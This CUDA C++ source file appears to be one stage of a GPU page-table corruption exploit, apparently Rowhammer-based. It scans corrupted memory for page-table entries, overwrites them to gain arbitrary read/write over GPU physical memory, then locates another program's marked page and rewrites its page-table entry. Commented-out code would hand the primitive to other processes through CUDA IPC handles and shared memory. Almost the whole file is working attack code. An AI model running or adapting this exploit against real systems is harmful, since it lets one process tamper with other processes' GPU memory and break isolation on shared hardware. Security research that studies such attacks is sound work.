#include "./s4_secondRegion.cuh"
#include <iostream>
#include <fstream>
#include <sys/mman.h>
#include <fcntl.h>
#include <filesystem>
#include <unistd.h>

static void
removeFirstArg (int &argc, char *argv[])
{
  for (int i = 1; i < argc; ++i)
    argv[i - 1] = argv[i];
  argc -= 1;
  argv[argc] = nullptr;
}

int
main (int argc, char *argv[])
{
  if (argc <= 1)
  {
    std::cout << "Not enough arguments.\n";
    return 0;
  }

  removeFirstArg (argc, argv);
  GPUBreachContext ctx = second_PT_region (argc, argv);

  auto &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
  auto &corrupted_ptr = ctx.step3_data.corrupted_ptr;
  
  char * flush_ptr;
  uint8_t *data_device_ptr;
  uint64_t flush_size = 3L * 1024 * 1024 * 1024;
  cudaMallocManaged(&flush_ptr, flush_size);
  cudaMallocManaged(&data_device_ptr, 2L * 1024 * 1024);

  initialize_memory_loop<<<1,1>>>((uint8_t*)flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());

  // Generate 64KB Pages
  gen_64KB(flush_ptr, flush_size);

  // Flush
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());

  uint64_t arb_rw_ofs;
  
  uint64_t initial_offset_1 = 0;
  uint64_t initial_offset_2 = 0;
  // std::cout << "This application helps transfers Arbitrary RW to another CUDA application: \n"
  //           << "(1) Ptr for Arbitrary RW (2) Pointer to PT Region (3) Offset to PTE of Ptr for Arbitrary RW" <<'\n';
  // std::cout << "Please select two 2MB PTE addresses and enter them:" << '\n';
  // std::cout << "Enter the first one:" << '\n' << std::flush;
  // std::cin >> std::hex >> initial_offset_1;
  // std::cout << "Enter the second one:" << '\n' << std::flush;
  // std::cin >> std::hex >> initial_offset_2;
  // std::cin >> std::dec;

  void* arb_rw_orig_ptr = nullptr;
  void* arb_rw_ptr = nullptr;
  void* pt_rw_orig_ptr = nullptr;

  const uint64_t null_pte =(uint64_t)(0x0600000000000001);
  const uint64_t mask_2MB_pte =        0xFF000000000FFFFULL;
  cudaMemcpyArray(data_device_ptr, corrupted_ptr, 64L * 1024);

  for (uint64_t z = 0; z < 64L * 1024; z+=16)
    {
      DBG_OUT << (void*)z << ' ' << *(void**)(data_device_ptr + z) << ' ' << (void*)((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) << '\n';
      if (((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) == null_pte && arb_rw_orig_ptr == nullptr)
      {
        arb_rw_orig_ptr = *(void**)(data_device_ptr + z);
        initial_offset_1 = z;
        DBG_OUT << "Found " << arb_rw_orig_ptr << '\n';
      }
      else if (((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) != (null_pte) && arb_rw_orig_ptr != nullptr)
      {
        arb_rw_orig_ptr = nullptr;
        initial_offset_1 = 0;
      }
      else if (((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) == (null_pte))
      {
        pt_rw_orig_ptr = *(void**)(data_device_ptr + z);
        initial_offset_2 = z;
        DBG_OUT << "Found" << arb_rw_orig_ptr <<'\n';
        break;
      }
      
    }

    if (debug_enabled())
    {
      std::cout << "Done \n";
      paused();
    }

  memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, (uint64_t)(0x60000000000001), 8);
  cudaDeviceSynchronize();
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());
  
  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
  {
    cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
    DBG_OUT << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << '\n';
    if (*(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
    {
      DBG_OUT << "Arb:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n' << std::flush;
      arb_rw_ptr = (void *)cudaMalloced_ptrs[j];
      arb_rw_ofs = j;
      break;
    }
    gpuErrchk(cudaPeekAtLastError());
  }

  uint64_t it_ptr = (uint64_t)(0x600000000000001);
  uint64_t target_pte_ofs = ((uint64_t)corrupted_ptr + initial_offset_1) % (2L * 1024 * 1024);
  for (uint64_t i = 0; i < (uint64_t)23L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
    {
      if (i > (uint64_t)0L * 1024 * 1024 * 1024)
      { 
        memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, it_ptr, 8);
        cudaDeviceSynchronize();
        gen_64KB(flush_ptr, flush_size);
        simple_flush<<<1,1>>>(flush_ptr, flush_size);
        cudaDeviceSynchronize();
        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr + target_pte_ofs, 8);
        // cudaMemcpy(&value_of_pointer, (uint8_t*)arb_rw_ptr + ((uint64_t)corrupted_ptr + 0xc100) % (2L * 1024 * 1024), 8, cudaMemcpyDeviceToHost);
        DBG_OUT << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
        if (*(void**)data_device_ptr == (void*)it_ptr)
        {
          DBG_OUT << *(void**)data_device_ptr << '\n';
          break;
        }
        cudaDeviceSynchronize();
        gpuErrchk(cudaPeekAtLastError());

        
      }
      it_ptr += 0x20000;
    }
  uint64_t pt_entry_phys = it_ptr;
  void* pt_rw_ptr = nullptr;
  uint64_t pt_rw_ofs;
  // Set another cudaMalloc to this:
  memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_2, pt_entry_phys, 8);
  cudaDeviceSynchronize();
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();

  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
  {
    cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
    if ((void *)cudaMalloced_ptrs[j] != arb_rw_ptr && *(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
    {
      std::cout << "PT rw:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
      pt_rw_ptr = (void *)cudaMalloced_ptrs[j];
      pt_rw_ofs = j;
      break;
    }
  }


  cudaMemcpyArray(data_device_ptr, (uint8_t*)pt_rw_ptr + target_pte_ofs, 8);
  DBG_OUT << "PT rw:" << *(void**)data_device_ptr <<  " Orig: "<< pt_rw_orig_ptr << '\n';
  cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
  DBG_OUT << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';

  std::cout << "(Stable Primitive Ready) Start your program now and load it with 0x6464646464646464. Press "
                "\033[1;32mEnter Key\033[0m to start finding and modifing that page's PTE."
              << '\n';
  paused();
  
  it_ptr = (uint64_t)(0x600000000000001);
  void* target = 0;
  for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
    {
      if (i > (uint64_t)0L * 1024 * 1024 * 1024)
      {
        memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, it_ptr, 8);
        cudaDeviceSynchronize();
        gen_64KB(flush_ptr, flush_size);
        simple_flush<<<1,1>>>(flush_ptr, flush_size);
        cudaDeviceSynchronize();

        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
        DBG_OUT << i << ' '<< (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
        bool ispage = true;
        if (*(void**)(data_device_ptr) == (void*)0x6464646464646464)
        {
          target = (void*)it_ptr;
            std::cout << "Found your page in " << (void*) it_ptr << ", Value: "<< (void*)0x6464646464646464 << '\n';
            break;
        }

        cudaDeviceSynchronize();
        gpuErrchk(cudaPeekAtLastError());   
      }
      it_ptr += 0x20000;
    }

  DBG_OUT << (void*)target << '\n';
  if (debug_enabled())
    paused();
  uint64_t other_ofs = 0;
  uint64_t other_phys = 0;
  it_ptr = (uint64_t)(0x0600000000000001);
  uint64_t mask =     0x00FFFFFFFFFFFF00ULL;
  for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
    {
      if (i > (uint64_t)0L * 1024 * 1024 * 1024)
      {
        memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, it_ptr, 8);
        cudaDeviceSynchronize();
        gen_64KB(flush_ptr, flush_size);
        simple_flush<<<1,1>>>(flush_ptr, flush_size);
        cudaDeviceSynchronize();

        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
        DBG_OUT << i << ' ' << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
        for (uint64_t z = 0; z < 2L * 1024 * 1024; z+=8)
        {
          // std::cout << '\t' << z << ' ' << (void*)it_ptr << ' ' << *(void**)(data_device_ptr + z) << '\n';
          if ((((*(uint64_t *)(data_device_ptr + z)) & mask) == ((uint64_t)target & mask)))
          // if (*(void**)(data_device_ptr + z) == target)
          {
            other_ofs = z;
            other_phys = it_ptr;
            DBG_OUT << "Found" << '\n';
            break;
          }
        }
        if (other_phys != 0)
          break;

        cudaDeviceSynchronize();
        gpuErrchk(cudaPeekAtLastError());   
      }
      it_ptr += 0x20000;
    }

  memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + other_ofs, (uint64_t)0x060000000fff0005, 8);
  cudaDeviceSynchronize();
  gen_64KB(flush_ptr, flush_size);
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();
  std::cout << "Found its PTE, modified your pointer's PTE to point to: "<< (void*) 0x060000000fff0005 << '\n';
  

  // cudaIpcMemHandle_t pt_handle;
  // cudaIpcMemHandle_t arb_handle;
  // cudaIpcGetMemHandle(&pt_handle, pt_rw_ptr);
  // cudaIpcGetMemHandle(&arb_handle, arb_rw_ptr);

  // std::ofstream file_pt("cuda_ipc_pt.bin", std::ios::binary);
  // file_pt.write(reinterpret_cast<char*>(&pt_handle), sizeof(pt_handle));
  // file_pt.close();

  // std::ofstream file_arb("cuda_ipc_arb.bin", std::ios::binary);
  // file_arb.write(reinterpret_cast<char*>(&arb_handle), sizeof(arb_handle));
  // file_arb.close();

  // std::cout << "Wrote CUDA IPC handles to 'cuda_ipc_arb.bin' and 'cuda_ipc_pt.bin'.\n\033[1;32mNow start your application and open the handles\033[0m.\n";
  // std::cout << "Press \033[1;32mEnter Key\033[0m when done...";

  // int shm_fd = shm_open("/exploitshm", O_CREAT | O_RDWR | O_TRUNC, 0666);
  // if (shm_fd == -1) {
  //     std::cerr << "Error creating shared memory" << std::endl;
  //     return -1;
  // }
  // ftruncate(shm_fd, sizeof(cudaIpcMemHandle_t) * 2);
  // cudaIpcMemHandle_t* shared_data = (cudaIpcMemHandle_t*)mmap(0, sizeof(cudaIpcMemHandle_t) * 2, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
  // if (shared_data == MAP_FAILED) {
  //     std::cerr << "Error mapping shared memory" << std::endl;
  //     return -1;
  // }
  // shared_data[0] = pt_handle;
  // shared_data[1] = arb_handle;

  // // std::system("./a.out");
  

  // cudaMemcpyArray(data_device_ptr, (uint8_t*)pt_rw_ptr + target_pte_ofs, 8);
  // std::cout << "PT rw:" << *(void**)data_device_ptr <<  " Orig: "<< pt_rw_orig_ptr << '\n';
  // cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
  // std::cout << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';

  // std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
  // paused();

  // // find orig pte entries:
  // //   for pt, make it the arb's physical location + offset
  // uint64_t arb_location = 0;
  // uint64_t pt_location = 0;
  // uint64_t arb_location_ofs = 0;
  // uint64_t pt_location_ofs = 0;
  // it_ptr = (uint64_t)(0x60000000000001);
  // for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
  //   {
  //     if (i > (uint64_t)14L * 1024 * 1024 * 1024)
  //     {
  //       memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, it_ptr, 8);
  //       cudaDeviceSynchronize();
  //       gen_64KB(flush_ptr, flush_size);
  //       simple_flush<<<1,1>>>(flush_ptr, flush_size);
  //       cudaDeviceSynchronize();

  //       cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
  //       std::cout << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
  //       for (int z = 0; z < 2L * 1024 * 1024; z+=8)
  //       {
  //         if (*(void**)(data_device_ptr + z) == arb_rw_orig_ptr)
  //         {
  //           arb_location = it_ptr;
  //           arb_location_ofs = z;
  //           std::cout << "Found" << '\n';
  //         }
  //         if (*(void**)(data_device_ptr + z) == pt_rw_orig_ptr)
  //         {
  //           pt_location = it_ptr;
  //           pt_location_ofs = z;
  //           std::cout << "Found" << '\n';
  //         }
  //       }
        
  //       if (arb_location != 0 && pt_location != 0)
  //       {
  //         break;
  //       }
  //       cudaDeviceSynchronize();
  //       gpuErrchk(cudaPeekAtLastError());   
  //     }
  //     it_ptr += 0x20000;
  //   }

  // // set new pt rw ptr to the PT's 2MB page
  // // pass new arb_location offset through file.
  // simple_flush<<<1,1>>>(flush_ptr, flush_size);
  // cudaDeviceSynchronize();

  // // Change arbitrary RW to pt_location
  // memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, pt_location, 8);
  // cudaDeviceSynchronize();

  // simple_flush<<<1,1>>>(flush_ptr, flush_size);
  // cudaDeviceSynchronize();

  // // Point pt_rw_ptr to page table
  // memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + pt_location_ofs, pt_location, 8);
  // cudaDeviceSynchronize();

  // simple_flush<<<1,1>>>(flush_ptr, flush_size);
  // cudaDeviceSynchronize();

  // // Point arbitrary RW to somewhere else
  // memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + arb_location_ofs, (uint64_t)(0x60000000000001), 8);
  // cudaDeviceSynchronize();

  // simple_flush<<<1,1>>>(flush_ptr, flush_size);
  // cudaDeviceSynchronize();

  // memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr, (uint64_t)(0xdeadbeef), 8);
  // cudaDeviceSynchronize();
  // cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
  // std::cout << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';

  // simple_flush<<<1,1>>>(flush_ptr, flush_size);
  // cudaDeviceSynchronize();

  // std::ofstream new_ofs_file("new_offset.bin", std::ios::binary);
  // new_ofs_file.write(reinterpret_cast<char*>(&arb_location_ofs), sizeof(arb_location_ofs));
  // new_ofs_file.close();
  // std::cout << arb_location_ofs << '\n';

  // std::cout << "Wrote new offset to 'new_offset.bin',\n\033[1;32mNow read the updated offset from this file in your application\033[0m.\n";
  // std::cout << "Your application should be able to have arbitrary RW as well now!\n";
  // std::cout << "Press \033[1;32mEnter Key\033[0m when done, the application will exit afterwards...";
  //   simple_flush<<<1,1>>>(flush_ptr, flush_size);
  // cudaDeviceSynchronize();
  // paused();



  // paused();
  return 0;
}